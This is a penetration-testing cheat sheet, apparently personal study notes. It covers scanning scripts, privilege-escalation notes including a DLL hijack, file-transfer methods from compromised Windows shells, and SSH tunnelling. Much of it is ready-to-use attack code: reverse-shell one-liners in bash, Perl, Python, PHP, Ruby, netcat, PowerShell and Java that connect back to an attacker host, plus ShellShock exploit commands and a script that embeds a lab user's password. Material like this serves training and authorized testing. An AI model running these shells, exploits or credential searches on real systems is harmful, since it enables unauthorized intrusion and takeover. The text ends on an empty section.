<span id="anchor"></span>Pentesting Notes

<span id="anchor-1"></span>Enumeration

<span id="anchor-2"></span>Banner Grabs

<span id="anchor-3"></span>Using telnet

|                                               |
| --------------------------------------------- |
| telnet **\<target IP/FQDN\> \<target port\>** |

<span id="anchor-4"></span>Using nc

|                                              |
| -------------------------------------------- |
| nc -v **\<target IP/FQDN\> \<target port\>** |

<span id="anchor-5"></span>HTTP Style Enumeration

<span id="anchor-6"></span>Get Server Options (telnet, nc)

<table>
<tbody>
<tr class="odd">
<td><p>telnet <strong>&lt;target IP/FQDN&gt; &lt;target port&gt;</strong></p>
<p>Escape character is '^]'.</p>
<p>OPTIONS * HTTP/1.1</p>
<p>Host: <strong>&lt;target IP/FQDN&gt;</strong></p>
<p>User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</p></td>
</tr>
</tbody>
</table>

<span id="anchor-7"></span>Get Headers (telnet, nc)

<table>
<tbody>
<tr class="odd">
<td><p>telnet <strong>&lt;target IP/FQDN&gt; &lt;target port&gt;</strong></p>
<p>Escape character is '^]'.</p>
<p>HEAD / HTTP/1.1</p>
<p>Host: <strong>&lt;target IP/FQDN&gt;</strong></p>
<p>User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</p></td>
</tr>
</tbody>
</table>

<span id="anchor-8"></span>Get Full Page Content (telnet, nc)

<table>
<tbody>
<tr class="odd">
<td><p>nc -v <strong>&lt;target IP/FQDN&gt; &lt;target port&gt;</strong></p>
<p>Escape character is '^]'.</p>
<p>GET / HTTP/1.1</p>
<p>Host: <strong>&lt;target IP/FQDN&gt;</strong></p>
<p>User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)</p></td>
</tr>
</tbody>
</table>

<span id="anchor-9"></span>

<span id="anchor-10"></span>Use Curl to Get HTTP OPTIONS Response

|                                           |
| ----------------------------------------- |
| curl -I -X OPTIONS **\<target IP/FQDN\>** |

<span id="anchor-11"></span>Use Curl to Get HTTP HEAD Response

|                                        |
| -------------------------------------- |
| curl -I -X HEAD **\<target IP/FQDN\>** |

<span id="anchor-12"></span>Use Invoke-WebRequest to Get HTTP OPTIONS
Response

<table>
<tbody>
<tr class="odd">
<td><p>[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls, Ssl3"</p>
<p>$(Invoke-WebRequest -URI <strong>&lt;target IP/FQDN&gt;</strong> -Method OPTIONS).RawContent</p></td>
</tr>
</tbody>
</table>

<span id="anchor-13"></span>Use Invoke-WebRequest to Get HTTP HEAD
Response

<table>
<tbody>
<tr class="odd">
<td><p>[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls, Ssl3"</p>
<p>$(Invoke-WebRequest -URI <strong>&lt;target IP/FQDN&gt;</strong> -Method HEAD).RawContent</p></td>
</tr>
</tbody>
</table>

<span id="anchor-14"></span>Privilege Escalation

Some basic notes/thoughts on gaining privilege escalation:

  - Path order exploitation
    
      - > Look for paths that exist in the path statement that may be
        > searched prior to the desired path location.

  - Unquoted Paths
    
      - > Look for unquoted paths in services and scheduled tasks. It
        > may be possible to create a path that will execute instead of
        > the intended path.

  - Path Permissions
    
      - > Look for paths that have permissions that you can write in

  - Missing DLL dependencies
    
      - > Locate services or other programs that attempt to load missing
        > DLLs or this could be combined with a path order error.

<span id="anchor-15"></span>IKEEXT Service Missing DLL Privileged
Execution

1.  Look for a path that in the %PATH% variable that your user is able
    to write to.

2.  Create a msfvenom payload using the DLL format option.

3.  Place the DLL into the path you located and rename it to:
    
      - > **Wlbsctrl.dll**

4.  Wait for a restart or trigger a restart of the IKEET service
    somehow.

<span id="anchor-16"></span>Scanning

<span id="anchor-17"></span>NMap

<span id="anchor-18"></span>Host Scan

Scans systems and reports a list of hosts that it finds up.

|                          |
| ------------------------ |
| nmap -sP 172.28.128.0/24 |

<span id="anchor-19"></span>Basic TCP Scan

Scan ports 1 through 65535 with timing set to 5, OS detection On,
Verbos, and TCP connect.

|                                              |
| -------------------------------------------- |
| nmap -p 1-65535 -T5 -A -v -sT 192.168.57.101 |

<span id="anchor-20"></span>Less Noisy SYN Scan

Scan ports 1 through 1024 with timing set to 0, OS detection On, Verbos,
and SYN Only.

|                                             |
| ------------------------------------------- |
| nmap -p 1-1024 -T0 -A -v -sS 192.168.57.101 |

<span id="anchor-21"></span>Scan a Service for Vulnerabilities Using NSE

Scan the hosts contained in the file for vulnerabilities that match the
given ls filter.

|                                                                                                                                                           |
| --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| for vuln in $(ls /usr/share/nmap/scripts/**\<filename mask\>**\*); do nmap -p 80 --open -iL **\<hostfile\>** --script $vuln \>\> **\<outputfile\>**; done |

<span id="anchor-22"></span>Quick ‘n Dirty Bash Ping Sweep

Scan the entire 10.11.1/24 network

<table>
<tbody>
<tr class="odd">
<td>#!/bin/bash<br />
<br />
for ((ip = 0; ip &lt;= 254; ip++));<br />
      do ping -c 1 10.11.1.$ip | grep "bytes from" | awk -F " " '{print $4}' | cut -d ":" -f 1 2&gt;&amp;1 &amp;<br />
      sleep .25<br />
done</td>
</tr>
</tbody>
</table>

<span id="anchor-23"></span>Python Ping Sweep with Multi-Threading
(Linux)

Scan the entire 10.11.1/24 network

<table>
<tbody>
<tr class="odd">
<td>#!/usr/bin/python<br />
<br />
import multiprocessing<br />
import subprocess<br />
import shlex<br />
<br />
from multiprocessing.pool import ThreadPool<br />
<br />
def call_proc(ip):<br />
      command = "ping -c1 " + ip + " | grep 'bytes from' | awk -F ' ' '{print $4}' | cut -d ':' -f 1"<br />
      p = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE)<br />
      while True:<br />
              out = p.stderr.read(1)<br />
              if out == '' and p.poll() != None:<br />
                      break<br />
              if out != '':<br />
                      sys.stdout.write(out)<br />
                      sys.stdout.flush()<br />
<br />
ips = []<br />
pool = ThreadPool(10)<br />
<br />
for i in range(1,255):<br />
      ips.append("10.11.1." + str(i))<br />
<br />
print(ips)<br />
<br />
pool.map(call_proc, ips)<br />
<br />
pool.close()<br />
pool.join()</td>
</tr>
</tbody>
</table>

<span id="anchor-24"></span>Python Ping Sweep with Multi-Threading
(Windows)

<table>
<tbody>
<tr class="odd">
<td><p>import multiprocessing</p>
<p>import subprocess</p>
<p>import shlex</p>
<p>import sys</p>
<p>from multiprocessing.pool import ThreadPool</p>
<p>def call_proc(ip):</p>
<p>        command = 'ping -n 1 {ip} | findstr "Reply from"'.format(ip = ip)</p>
<p>        p = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE)</p>
<p>        while True:</p>
<p>                out = p.stderr.read(1)</p>
<p>                if out == '' and p.poll() != None:</p>
<p>                        break</p>
<p>                if out != '':</p>
<p>                        sys.stdout.write(out)</p>
<p>                        sys.stdout.flush()</p>
<p>ips = []</p>
<p>pool = ThreadPool(10)</p>
<p>for i in range(1,255):</p>
<p>        ips.append("10.1.1." + str(i))</p>
<p>print(ips)</p>
<p>pool.map(call_proc, ips)</p>
<p>pool.close()</p>
<p>pool.join()</p></td>
</tr>
</tbody>
</table>

<span id="anchor-25"></span>Python Port Scan

<table>
<tbody>
<tr class="odd">
<td>#!/usr/bin/env python<br />
import socket<br />
import subprocess<br />
import sys<br />
from datetime import datetime<br />
<br />
# Clear the screen<br />
subprocess.call('clear', shell=True)<br />
<br />
# Ask for input<br />
remoteServer   = raw_input("Enter a remote host to scan: ")<br />
remoteServerIP = socket.gethostbyname(remoteServer)<br />
<br />
# Print a nice banner with information on which host we are about to scan<br />
print "-" * 60<br />
print "Please wait, scanning remote host", remoteServerIP<br />
print "-" * 60<br />
<br />
# Check what time the scan started<br />
t1 = datetime.now()<br />
<br />
# Using the range function to specify ports (here it will scans all ports between 1 and 1024)<br />
<br />
# We also put in some error handling for catching errors<br />
<br />
try:<br />
  for port in range(1,1025):<br />
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
      result = sock.connect_ex((remoteServerIP, port))<br />
      if result == 0:<br />
          print "Port {port}: Open".format(port = port)<br />
      sock.close()<br />
<br />
except KeyboardInterrupt:<br />
  print "You pressed Ctrl+C"<br />
  sys.exit()<br />
<br />
except socket.gaierror:<br />
  print 'Hostname could not be resolved. Exiting'<br />
  sys.exit()<br />
<br />
except socket.error:<br />
  print "Couldn't connect to server"<br />
  sys.exit()<br />
<br />
# Checking the time again<br />
t2 = datetime.now()<br />
<br />
# Calculates the difference of time, to see how long it took to run the script<br />
total = t2 - t1<br />
<br />
# Printing the information to screen<br />
print 'Scanning Completed in: ', total</td>
</tr>
</tbody>
</table>

<span id="anchor-26"></span>Python Port Scanner (Multi-Threaded)

<table>
<tbody>
<tr class="odd">
<td><p>#!/usr/bin/env python</p>
<p>import socket</p>
<p>import subprocess</p>
<p>import sys</p>
<p>import multiprocessing</p>
<p>import subprocess</p>
<p>import shlex</p>
<p>from datetime import datetime</p>
<p>from multiprocessing.pool import ThreadPool</p>
<p># Clear the screen</p>
<p>subprocess.call('clear', shell=True)</p>
<p># Ask for input</p>
<p>remoteServer   = raw_input("Enter a remote host to scan: ")</p>
<p>remoteServerIP = socket.gethostbyname(remoteServer)</p>
<p># Print a nice banner with information on which host we are about to scan</p>
<p>print "-" * 60</p>
<p>print "Please wait, scanning remote host", remoteServerIP</p>
<p>print "-" * 60</p>
<p># Check what time the scan started</p>
<p>t1 = datetime.now()</p>
<p># Using the range function to specify ports (here it will scans all ports between 1 and 1024)</p>
<p># We also put in some error handling for catching errors</p>
<p>def scan_port(port):</p>
<p>try: </p>
<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
<blockquote>
<p>sock.settimeout(1)</p>
</blockquote>
<p>result = sock.connect_ex((remoteServerIP, port))</p>
<p>if result == 0:</p>
<p>print "Port {port}: Open".format(port = port)</p>
<p>sock.close()</p>
<p>except KeyboardInterrupt:</p>
<p>print "You pressed Ctrl+C"</p>
<p>sys.exit()</p>
<p>except socket.gaierror:</p>
<p>print 'Hostname could not be resolved. Exiting'</p>
<p>sys.exit()</p>
<p>except socket.error:</p>
<p>print "Couldn't connect to server"</p>
<p>sys.exit()</p>
<p>ports = []</p>
<p>pool = ThreadPool(10)</p>
<p>for port in range(1,1025):</p>
<p>ports.append(port)</p>
<p>pool.map(scan_port, ports)</p>
<p>pool.close()</p>
<p>pool.join()</p>
<p># Checking the time again</p>
<p>t2 = datetime.now()</p>
<p># Calculates the difference of time, to see how long it took to run the script</p>
<p>total = t2 - t1</p>
<p># Printing the information to screen</p>
<p>print 'Scanning Completed in: ', total</p></td>
</tr>
</tbody>
</table>

<span id="anchor-27"></span>PowerShell Port Scan

|                                                                                                                        |
| ---------------------------------------------------------------------------------------------------------------------- |
| 1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("**\<ip address\>**", $\_)) "$\_ is open" } 2\>Out-Null |

<span id="anchor-28"></span>GoBuster (Web Common Folder Scan)

|                                                                                                                      |
| -------------------------------------------------------------------------------------------------------------------- |
| gobuster -u **\<url\>** -w /usr/share/seclists/Discovery/Web\_Content/common.txt -s '200,204,301,302,307,403,500' -e |

<span id="anchor-29"></span>GoBuster (Web Common CGI Scan)

|                                                                                                                    |
| ------------------------------------------------------------------------------------------------------------------ |
| gobuster -u **\<url\>** -w /usr/share/seclists/Discovery/Web\_Content/cgis.txt -s '200,204,301,302,307,403,500' -e |

<span id="anchor-30"></span>Pivoting

<span id="anchor-31"></span>SSH Reverse Proxy

<table>
<tbody>
<tr class="odd">
<td><p>From remote system (behind firewall):</p>
<p>ssh -R 8888:localhost:22 <strong>&lt;local_user&gt;</strong>@<strong>&lt;local_machine&gt;</strong></p>
<p>From local system:</p>
<p>ssh -D 8181 <strong>&lt;remote_user&gt;</strong>@localhost -p 8888</p></td>
</tr>
</tbody>
</table>

<span id="anchor-32"></span>Ncat Fu

<span id="anchor-33"></span>Send Connection/Banner Grab

Grab the banner from the specified SMTP server

|                                  |
| -------------------------------- |
| ncat -nv \<ip address\> \<port\> |

<span id="anchor-34"></span>Files

<span id="anchor-35"></span>Locating Files

<span id="anchor-36"></span>Locate files with setuid bits (\*nix)

|                                                     |
| --------------------------------------------------- |
| find / -perm 4000 -o perm 2000 -exec ls -ldb {} \\; |

<span id="anchor-37"></span>Locate files belonging to a user (\*nix)

<span id="anchor-38"></span>Version 1

|                                    |
| ---------------------------------- |
| find -u \<username\> 2\> /dev/null |

<span id="anchor-39"></span>Version 2

|                                       |
| ------------------------------------- |
| find -user \<username\> 2\> /dev/null |

<span id="anchor-40"></span>Locate files belonging to a group (\*nix)

<span id="anchor-41"></span>Version 1

|                                     |
| ----------------------------------- |
| find -g \<groupname\> 2\> /dev/null |

<span id="anchor-42"></span>Version 2

|                                         |
| --------------------------------------- |
| find -group \<groupname\> 2\> /dev/null |

<span id="anchor-43"></span>Locate files that are world writable (\*nix)

|                                                   |
| ------------------------------------------------- |
| find / -perm -2 \! -type l -ls -xdev 2\>/dev/null |

<span id="anchor-44"></span>Locate Files with Weak Permissions (Windows)

See [*accesschk.exe*](#_z7kt47j1y476) section

<span id="anchor-45"></span>Locate Credential Files (Windows)

|                                                      |
| ---------------------------------------------------- |
| dir /S **\[\*pass\*|\*cred\*|\*vnc\*|\*.config\*\]** |

<span id="anchor-46"></span>Locate Files Containing \<String\>

|                                                         |
| ------------------------------------------------------- |
| findstr /SI **\<string\>** **\[\*.xml|\*.ini|\*.txt\]** |

<span id="anchor-47"></span>Locate Files & Folders Accessible to Root
Only

|                                                              |
| ------------------------------------------------------------ |
| find **\<path\>** -user root -perm +400 \! -perm +044 -print |

<span id="anchor-48"></span>Transfer Files

<span id="anchor-49"></span>Transfer Files Using NetCat (nc)

<span id="anchor-50"></span>Receiving

|                                           |
| ----------------------------------------- |
| nc -l -p **\<port\>** \> **\<filename\>** |

<span id="anchor-51"></span>Sending

|                                                     |
| --------------------------------------------------- |
| nc **\<address\>** **\<port\>** \< **\<filename\>** |

<span id="anchor-52"></span>TFTP (from reverse Windows shell)

|                                             |
| ------------------------------------------- |
| tftp **\<ipaddress\>** GET **\<filename\>** |

<span id="anchor-53"></span>FTP (from reverse Windows shell)

<table>
<tbody>
<tr class="odd">
<td><p>echo open <strong>&lt;ipaddress&gt;</strong> 21&gt; ftp.txt<br />
echo USER offsec&gt;&gt; ftp.txt<br />
echo <strong>&lt;password&gt;</strong>&gt;&gt; ftp.txt<br />
echo bin &gt;&gt; ftp.txt<br />
echo GET <strong>&lt;filename&gt;</strong> &gt;&gt; ftp.txt<br />
echo bye &gt;&gt; ftp.txt</p>
<p><br />
ftp –v -n -s:ftp.txt</p></td>
</tr>
</tbody>
</table>

<span id="anchor-54"></span>VBScript (from reverse Windows shell)

Usage: cscript http://**\<ipaddress\>**/**\<file\>**
**\<localfilename\>**

<table>
<tbody>
<tr class="odd">
<td>echo strUrl = WScript.Arguments.Item(0) &gt; wget.vbs<br />
echo StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs<br />
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs<br />
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs<br />
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs<br />
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs<br />
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs<br />
echo Err.Clear &gt;&gt; wget.vbs<br />
echo Set http = Nothing &gt;&gt; wget.vbs<br />
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") &gt;&gt; wget.vbs<br />
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") &gt;&gt; wget.vbs<br />
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") &gt;&gt; wget.vbs<br />
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") &gt;&gt; wget.vbs<br />
echo http.Open "GET", strURL, False &gt;&gt; wget.vbs<br />
echo http.Send &gt;&gt; wget.vbs<br />
echo varByteArray = http.ResponseBody &gt;&gt; wget.vbs<br />
echo Set http = Nothing &gt;&gt; wget.vbs<br />
echo Set fs = CreateObject("Scripting.FileSystemObject") &gt;&gt; wget.vbs<br />
echo Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs<br />
echo strData = "" &gt;&gt; wget.vbs<br />
echo strBuffer = "" &gt;&gt; wget.vbs<br />
echo For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs<br />
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs<br />
echo Next &gt;&gt; wget.vbs<br />
echo ts.Close &gt;&gt; wget.vbs</td>
</tr>
</tbody>
</table>

<span id="anchor-55"></span>Invoke-WebRequest (from reverse Windows
shell)

Requires PowerShell v3.0 or higher. Relies on IE. May not work on
Windows Server.

|                                                                                                                 |
| --------------------------------------------------------------------------------------------------------------- |
| PS C:\\\> Invoke-WebRequest -Uri **\<URI\>** -OutFile **\<dest\_filename\>** -UserAgent **\<useragentstring\>** |

<span id="anchor-56"></span>PowerShell System.Net.WebClient (from
reverse Windows shell)

**NOTE:** Use only valid URLs and File Names or you will hang the shell.
Can be re-used by specifying -url and -file arguments.

<table>
<tbody>
<tr class="odd">
<td>echo param ( [string]$url = "<strong>&lt;URI&gt;</strong>", [string]$file = "<strong>&lt;filename&gt;</strong>" ) &gt; wget.ps1<br />
echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1<br />
echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1</td>
</tr>
</tbody>
</table>

<span id="anchor-57"></span>PowerShell BITS Transfer (from reverse
Windows shell)

**NOTE:** Use only valid URLs and File Names or you will hang the shell.

**NOTE:** BITS service must be running.

Can be re-used by specifying -url and -file arguments.

<table>
<tbody>
<tr class="odd">
<td><p>echo param ( [string]$url = "<strong>&lt;URI&gt;</strong>", [string]$file = "<strong>&lt;filename&gt;</strong>" ) &gt; bitsget.ps1</p>
<p>echo Import-Module BitsTransfer &gt;&gt; bitsget.ps1<br />
echo Start-BitsTransfer -Source $url -Destination $file &gt;&gt; bitsget.ps1</p></td>
</tr>
</tbody>
</table>

<span id="anchor-58"></span>Python Download Echo Script (Windows)

<table>
<tbody>
<tr class="odd">
<td>echo import urllib &gt; download.py<br />
echo testfile = urllib.URLopener() &gt;&gt; download.py<br />
echo testfile.retrieve('<strong>&lt;url_with_file&gt;</strong>', '<strong>&lt;file_name_to_save&gt;</strong>') &gt;&gt; download.py</td>
</tr>
</tbody>
</table>

<span id="anchor-59"></span>Debug (from reverse Windows shell)

This method has size limitations. It will only work with 64k or smaller
files.

<table>
<tbody>
<tr class="odd">
<td><p># First use upx to pack the file to make it smaller</p>
<p>upx -9 &lt;originalPE&gt;</p>
<p># Use exe2bat.exe to convert the file to a BAT file format</p>
<p>wine exe2bat.exe <strong>&lt;originalPE&gt;</strong> <strong>&lt;destination&gt;</strong></p>
<p># Copy and paste the contents of the destination file to your reverse shell</p></td>
</tr>
</tbody>
</table>

<span id="anchor-60"></span>Copy Command (Share Access)

|                                             |
| ------------------------------------------- |
| copy \\\\**\<source\>** **\<destination\>** |

<span id="anchor-61"></span>Echo Command (Share Access)

|                                                             |
| ----------------------------------------------------------- |
| echo “**\<base64 encoded data\>**” \>\> **\<destination\>** |

**Note**: By base64 encoding the file you will turn it into plain text
that can be echoed to the remote system. It can then be decoded using
the **certutil.exe** command.

<span id="anchor-62"></span>PHP Remote Include FTP Download Script

<table>
<tbody>
<tr class="odd">
<td><p>&lt;?php</p>
<p>     // set up basic connection<br />
   $conn_id = ftp_connect("<strong>&lt;ftp_server_address&gt;</strong>");<br />
   // login with username and password<br />
   $login_result = ftp_login($conn_id, "anonymous", "foo@bar.com");<br />
   // check connection</p>
<p>     if ((!$conn_id) || (!$login_result)) {<br />
        echo "Ftp connection has failed!";<br />
        echo "Attempted to connect to $ftp_server for user $user";<br />
        die;<br />
   } else { </p>
<p>          echo "Connected";<br />
   }<br />
   // upload the file<br />
   $upload = ftp_get($conn_id, "<strong>&lt;writable_path&gt;</strong>, "nc", FTP_BINARY);<br />
  echo $upload;<br />
  // close the FTP stream<br />
  ftp_quit($conn_id);</p>
<p>?&gt;</p></td>
</tr>
</tbody>
</table>

<span id="anchor-63"></span>Tunneling

<span id="anchor-64"></span>SSH Tunnels

<span id="anchor-65"></span>SSH Remote Port Forwarding

|                                                                                          |
| ---------------------------------------------------------------------------------------- |
| ssh **\<gateway\>** -R **\<remote port to bind\>**:**\<local host\>**:**\<local port\>** |

  - **\<gateway\>** = The Hostname/IP of the machine you are working
    from.
  - **\<localhost\>** = The local IP of the machine that you have a
    shell open on. I.e. 127.0.0.1
  - **\<remote port to bind\>** = The local port of the machine that you
    have a shell open on. This is the port that you will connect to.
  - **\<local port\>** = The port that the service you want to connect
    to is running.

**EXAMPLE: **ssh 10.0.0.20 -R 3390:127.0.0.1:3389

In the above example, this command is being run from the compromised
system. You are connecting back to your working machine. 127.0.0.1:3390
on your working machine is now connected to port 3389 on the compromised
system.

<span id="anchor-66"></span>SSH Local Port Forwarding

|                                                                                             |
| ------------------------------------------------------------------------------------------- |
| ssh **\<gateway\>** -L **\<local port to listen\>**:**\<remote host\>**:**\<remote port\>** |

  - **\<gateway\>** = The Hostname/IP of the machine you are working
    from.
  - **\<remote host\>** = The IP address of the server you would like to
    redirect traffic to.
  - **\<local port to listen\>** = The local port of the machine that
    you have a shell open on.
  - **\<remote port\>** = The port on the remote server that you would
    like to redirect traffic to.

**EXAMPLE:** ssh 10.0.0.20 -L 8080:11.11.11.11:80

In the above example, this command is being run from the compromised
system. You are attempting to forward traffic on the compromised system
from 127.0.0.1:8080 to the remote web server hosted on 11.11.11.11:80.

<span id="anchor-67"></span>Reverse Shells

[*http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet*](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

<span id="anchor-68"></span>One-Liners

Try substituting “cmd.exe” instead of “/bin/sh” or “/bin/bash” to make
these work in Windows.

Try the following command separators: ;, &&, |, ||

<span id="anchor-69"></span>Bash v1

|                                          |
| ---------------------------------------- |
| bash -i \>& /dev/tcp/10.0.0.1/8080 0\>&1 |

<span id="anchor-70"></span>Bash v1.5

|                                                      |
| ---------------------------------------------------- |
| bash -c 'bash -i \>& /dev/tcp/\<ip\>/\<port\> 0\>&1' |

<span id="anchor-71"></span>Bash v2

|                                                                                                |
| ---------------------------------------------------------------------------------------------- |
| bash -c 'exec 5\<\>/dev/tcp/\<ip\>/\<port\>; while read line 0\<&5; do $line 2\>&5 \>&5; done' |

<span id="anchor-72"></span>Bash v3

|                                                                                                     |
| --------------------------------------------------------------------------------------------------- |
| bash -c 'exec 5\<\>/dev/tcp/\<ip\>/\<port\>; cat \<&5 | while read line; do $line 2\>&5 \>&5; done' |

<span id="anchor-73"></span>URL Encoded

|                                                                                                 |
| ----------------------------------------------------------------------------------------------- |
| bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F**\<address\>**%2F**\<port\>**%200%3E%261%27 |

<span id="anchor-74"></span>Perl

|                                                                                                                                                                                                                                     |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,"\>\&S");open(STDOUT,"\>\&S");open(STDERR,"\>\&S");exec("/bin/sh -i");};' |

<span id="anchor-75"></span>PowerShell

|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| $client = New-Object System.Net.Sockets.TCPClient('**\<IP\_Address\>**',**\<port\>**);$stream = $client.GetStream();\[byte\[\]\]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '\> ';$sendbyte = (\[text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}; |

<span id="anchor-76"></span>Python

|                                                                                                                                                                                                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);' |

<span id="anchor-77"></span>PHP

|                                                                               |
| ----------------------------------------------------------------------------- |
| php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i \<&3 \>&3 2\>&3");' |

<span id="anchor-78"></span>Ruby

|                                                                                                               |
| ------------------------------------------------------------------------------------------------------------- |
| ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to\_i;exec sprintf("/bin/sh -i \<&%d \>&%d 2\>&%d",f,f,f)' |

<span id="anchor-79"></span>Netcat

<span id="anchor-80"></span>Version 1

|                             |
| --------------------------- |
| nc -e /bin/sh 10.0.0.1 1234 |

<span id="anchor-81"></span>Version 2

|                                                                               |
| ----------------------------------------------------------------------------- |
| rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\>&1|nc 10.0.0.1 1234 \>/tmp/f |

<span id="anchor-82"></span>Java

<table>
<tbody>
<tr class="odd">
<td>r = Runtime.getRuntime()<br />
p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[])<br />
p.waitFor()</td>
</tr>
</tbody>
</table>

<span id="anchor-83"></span>ShellShock Reverse Shells

<span id="anchor-84"></span>Curl - One-Liner

|                                                                                                                           |
| ------------------------------------------------------------------------------------------------------------------------- |
| curl -A "() { :;}; echo 'Content-type: text/html'; echo; /bin/ls -al /home/bynarr;" http://192.168.56.101:591/cgi-bin/cat |

<span id="anchor-85"></span>Python Reverse Shell - ShellShock w/Sudo

<table>
<tbody>
<tr class="odd">
<td><p>import requests,sys</p>
<p>from base64 import b64encode</p>
<p>while True:</p>
<p>    user_command = b64encode(raw_input('$ ').strip())</p>
<p>    payload = b64encode("python -c 'import pty,subprocess,os,time;from base64 import b64decode;(master,slave)=pty.openpty();p=subprocess.Popen([\"/bin/su\",\"-c\",b64decode(\"%s\"),\"bynarr\"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,\"fruity\\n\");time.sleep(0.1);print os.read(master,1024);'"%user_command)</p>
<p>    headers = {</p>
<p>   'User-Agent': '() { :; }; echo \'Content-type: text/html\'; echo; export PATH=$PATH:/usr/bin:/bin:/sbin; echo \'%s\' | base64 -d | bash 2&gt;&amp;1' % payload</p>
<p>    }</p>
<p>    print requests.get('http://192.168.56.101:591/cgi-bin/cat', headers=headers).text.strip()</p></td>
</tr>
</tbody>
</table>

<span id="anchor-86"></span>Python Reverse Shells

<span id="anchor-87"></span>Straight Python Shell

<table>
<tbody>
<tr class="odd">
<td>import socket,os<br />
so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />
so.connect(('<strong>&lt;LHOST&gt;</strong>',<strong>&lt;LPORT&gt;</strong>))<br />
Hc=False<br />
while not Hc:<br />
data=so.recv(1024)<br />
if len(data)==0:<br />
Hc=True<br />
stdin,stdout,stderr,=os.popen3(data)<br />
stdout_value=stdout.read()+stderr.read()<br />
so.send(stdout_value)</td>
</tr>
</tbody>
</table>

<span id="anchor-88"></span>Encode a Python Script (Base64)

<table>
<tbody>
<tr class="odd">
<td>import base64<br />
<br />
with open('<strong>&lt;script_file&gt;</strong>', 'rb') as f:<br />
  encoded = base64.b64encode(f.read())<br />
  print encoded</td>
</tr>
</tbody>
</table>

<span id="anchor-89"></span>Decode an Encoded Python Script (Base64)

<table>
<tbody>
<tr class="odd">
<td><p>import base64; </p>
<p>with open('decoded_script.py', 'w') as f:</p>
<p>    decoded = ‘<strong>&lt;base64_string&gt;</strong>'.decode('base64')</p>
<p>    f.write(decoded)</p>
<p>    f.close()</p></td>
</tr>
</tbody>
</table>

<span id="anchor-90"></span>Fix TTY Issues In Reverse Shells

<span id="anchor-91"></span>Python PTY

<table>
<tbody>
<tr class="odd">
<td><p>python -c 'import pty; pty.spawn("/bin/bash")'</p>
<p>Then fix the term type:</p>
<p>set TERM=linux</p>
<p>Or</p>
<p>export TERM=linux</p>
<p>clear</p></td>
</tr>
</tbody>
</table>

<span id="anchor-92"></span>Python Sudo w/o TTY

|                                                                                                                                                                                                                                                                 |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(\["/bin/su","-c","id","bynarr"\],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\\n");time.sleep(0.1);print os.read(master,1024);' |

<span id="anchor-93"></span>RDP Via Plink Tunnel
([*https://www.chiark.greenend.org.uk/\~sgtatham/putty/latest.html*](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html))

From Remote/Compromised Host

|                                                                                                           |
| --------------------------------------------------------------------------------------------------------- |
